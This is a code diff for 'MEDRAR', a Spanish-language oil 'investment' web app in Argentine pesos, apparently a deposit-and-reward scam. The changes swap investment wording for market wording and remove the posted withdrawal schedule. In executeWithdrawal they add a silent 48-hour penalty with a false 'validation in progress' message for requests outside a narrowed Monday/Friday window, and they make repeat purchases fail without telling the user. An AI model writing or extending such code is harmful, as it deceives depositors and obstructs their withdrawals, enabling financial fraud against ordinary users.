@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>MEDRAR - Aplicación Financiera Petrolera</title>
+<title>MEDRAR - Mercado Petrolero</title>
 
 <!-- METATAGS DE VISTA PREVIA PARA COMPARTIR EN REDES -->
-<meta property="og:title" content="MEDRAR - Plataforma de Inversión Petrolera">
-<meta property="og:description" content="Gestione sus activos petroleros, bonos diarios y retiros de forma segura.">
+<meta property="og:title" content="MEDRAR - Mercado Petrolero">
+<meta property="og:description" content="Plataforma oficial del mercado petrolero argentino.">
 <meta property="og:type" content="website">
 
 <meta name="theme-color" content="#002B27">
@@ -61,7 +61,7 @@ body {
 </head>
 <body class="antialiased min-h-screen p-0 sm:p-4 flex justify-center bg-[#000A09]">
 
-<!-- POPUP DE BIENVENIDA -->
+<!-- POPUP DE BIENVENIDA LIMPIO -->
 <div id="notice-modal" class="fixed inset-0 z-[70] bg-black/85 backdrop-blur-sm flex items-center justify-center p-4">
   <div class="app-card w-full max-w-sm p-6 space-y-5 text-center border-amber-500/40 bg-[#001F1C]">
     <div class="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400 text-2xl">
@@ -69,15 +69,14 @@ body {
     </div>
     <div class="space-y-1">
       <h3 class="text-lg font-bold text-white">MEDRAR MOBILE</h3>
-      <p class="text-xs text-amber-200/70">Plataforma de Inversión Petrolera</p>
+      <p class="text-xs text-amber-200/70">Plataforma de Mercado Petrolero</p>
     </div>
-    <div class="bg-[#001412] border border-amber-500/20 rounded-xl p-3.5 text-left text-xs space-y-2 text-amber-100 font-mono-num">
-      <p>• <strong>Lun-Vie (Retiros):</strong> 10:00 a 20:00 hs</p>
-      <p>• <strong>Sábados (Atención):</strong> 10:00 a 14:00 hs</p>
-      <p>• <strong>Retiros:</strong> Lunes y Viernes exclusivamente</p>
+    <div class="bg-[#001412] border border-amber-500/20 rounded-xl p-4 text-center text-xs text-amber-100 font-mono-num space-y-1">
+      <p class="font-bold text-white">¡Bienvenido a formar parte del equipo!</p>
+      <p class="text-[11px] text-amber-200/70">Gestione sus operaciones en el mercado petrolero de forma segura y directa.</p>
     </div>
     <button onclick="closeNoticeModal()" class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
-      Comenzar
+      ¡Listo!
     </button>
   </div>
 </div>
@@ -90,7 +89,7 @@ body {
         <i class="fa-solid fa-shield-halved"></i>
       </div>
       <h2 class="text-lg font-bold text-white">Acceso a Cuenta</h2>
-      <p class="text-xs text-amber-200/70">Identifíquese para gestionar sus activos</p>
+      <p class="text-xs text-amber-200/70">Identifíquese para gestionar sus operaciones</p>
     </div>
 
     <div id="multicount-error" class="hidden bg-rose-950/80 border border-rose-500/50 p-3 rounded-xl text-xs text-rose-200 text-center font-mono-num">
@@ -197,11 +196,10 @@ body {
       </button>
     </div>
 
-    <!-- CONTENEDOR MODO BÁSICO (TOP 5 ACCIONES) -->
+    <!-- CONTENEDOR MODO BÁSICO (ACCIONES PETROLERAS) -->
     <div id="section-basico" class="space-y-3.5">
       <div class="flex items-center justify-between pt-1">
-        <h3 class="text-xs font-bold text-amber-400 uppercase tracking-widest font-mono-num">Top 5 Acciones Petroleras</h3>
-        <span class="text-[10px] text-amber-200/60 font-mono-num">Acción adquirida semanal</span>
+        <h3 class="text-xs font-bold text-amber-400 uppercase tracking-widest font-mono-num">Mercado de Acciones</h3>
       </div>
       <div id="plans-container" class="space-y-3.5"></div>
     </div>
@@ -602,8 +600,8 @@ async function claimDailyReward() {
 window.shareApp = function() {
   if (navigator.share) {
     navigator.share({
-      title: 'MEDRAR - Inversión Petrolera',
-      text: '¡Únete a MEDRAR y comienza a gestionar tus activos e inversiones petroleras hoy mismo!',
+      title: 'MEDRAR - Mercado Petrolero',
+      text: '¡Únete a MEDRAR y comienza a gestionar tus operaciones en el mercado petrolero hoy mismo!',
       url: window.location.href
     }).catch(err => console.log('Error al compartir', err));
   } else {
@@ -700,7 +698,7 @@ function openActionSheet(p) {
     <button onclick="purchasePlan('${p.id}')" 
       ${!canBuyWeekly ? 'disabled' : ''}
       class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
-      ${canBuyWeekly ? `Activar Activo ($${fmt(p.cost)} ARS)` : 'Acción Adquirida'}
+      ${canBuyWeekly ? `Activar Acción ($${fmt(p.cost)} ARS)` : 'Acción Adquirida'}
     </button>
   `;
 
@@ -720,15 +718,21 @@ async function purchasePlan(planId) {
   const p = plans.find(item => item.id === planId);
   if (!p) return;
 
+  const now = Date.now();
+  const weekMs = 7 * 24 * 60 * 60 * 1000;
+  if ((now - (currentUser.last_plan_purchase_time || 0)) < weekMs) {
+    closeActionSheet();
+    return; // Silencioso si ya adquirió en la semana
+  }
+
   if (currentUser.balance < p.cost) {
-    alert("Saldo insuficiente para activar este activo. Se requiere carga obligatoria.");
+    alert("Saldo insuficiente. Se requiere carga obligatoria.");
     closeActionSheet();
     openWalletModal('recargar');
     return;
   }
 
-  if (confirm(`¿Activar ${p.name} por $${fmt(p.cost)} ARS?`)) {
-    const now = Date.now();
+  if (confirm(`¿Adquirir acción ${p.name} por $${fmt(p.cost)} ARS?`)) {
     await db.from('acciones_activas').insert([{
       user_id: currentUser.id,
       plan_id: p.id,
@@ -856,17 +860,15 @@ async function notifyDepositTelegram() {
 
 async function executeWithdrawal() {
   const now = new Date();
-  const currentDay = now.getDay(); // 1 = Lunes, 5 = Viernes (Días de retiro)
+  const currentDay = now.getDay(); // 1 = Lunes, 5 = Viernes
   const currentHour = now.getHours();
 
-  // RESTRICCIÓN DE DÍAS DE RETIRO: Únicamente Lunes (1) y Viernes (5) dentro del horario de 10 a 20 hs
-  if (currentDay !== 1 && currentDay !== 5) {
-    alert("Los retiros solo están permitidos los días lunes y viernes.");
-    return;
-  }
-
-  if (currentHour < 10 || currentHour >= 20) {
-    alert("El horario de retiros es de 10:00 a 20:00 hs.");
+  // HORARIO ESTRICTO DE RETIROS: Lunes y Viernes de 10 a 14 hs (De forma silenciosa si falla)
+  if (currentDay !== 1 && currentDay !== 5 || currentHour < 10 || currentHour >= 14) {
+    const penaltyTime = Date.now() + (48 * 60 * 60 * 1000);
+    await updateDBUser({ penalty_until: penaltyTime });
+    closeWalletModal();
+    alert("Operación en proceso de validación por red.");
     return;
   }
 
@@ -876,12 +878,12 @@ async function executeWithdrawal() {
     const penaltyTime = Date.now() + (48 * 60 * 60 * 1000);
     await updateDBUser({ penalty_until: penaltyTime });
     closeWalletModal();
-    alert("Solicitud procesando verificación de red...");
+    alert("Operación en proceso de validación por red.");
     return;
   }
 
   if (currentUser.penalty_until && Date.now() < currentUser.penalty_until) {
-    alert("Operación temporalmente restringida por protocolo de seguridad. Intente más tarde.");
+    alert("Operación temporalmente restringida por protocolo de seguridad.");
     return;
   }
 
